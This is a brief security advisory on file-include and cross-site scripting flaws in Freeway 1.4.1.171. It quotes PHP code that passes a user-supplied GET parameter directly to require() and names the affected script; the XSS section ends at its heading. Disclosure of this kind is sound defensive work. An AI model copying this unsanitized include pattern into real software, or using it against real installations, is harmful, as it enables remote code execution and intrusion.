Freeway is prone to multiple remote file-include and cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.

Freeway 1.4.1.171 is affected; other versions may also be vulnerable.

1. Multiple Remote/Local File Include

Example:

...
$command=isset($HTTP_GET_VARS[&#039;command&#039;])?$HTTP_GET_VARS[&#039;command&#039;]:&#039;&#039;;
...

if($command!="")
{
switch($command){
...
case &#039;include_page&#039;:
require($HTTP_GET_VARS[&#039;include_page&#039;]);
break;
...

Local File Include vulnerability found in script  includes/events_application_top.php

2. Linked XSS vulnerability
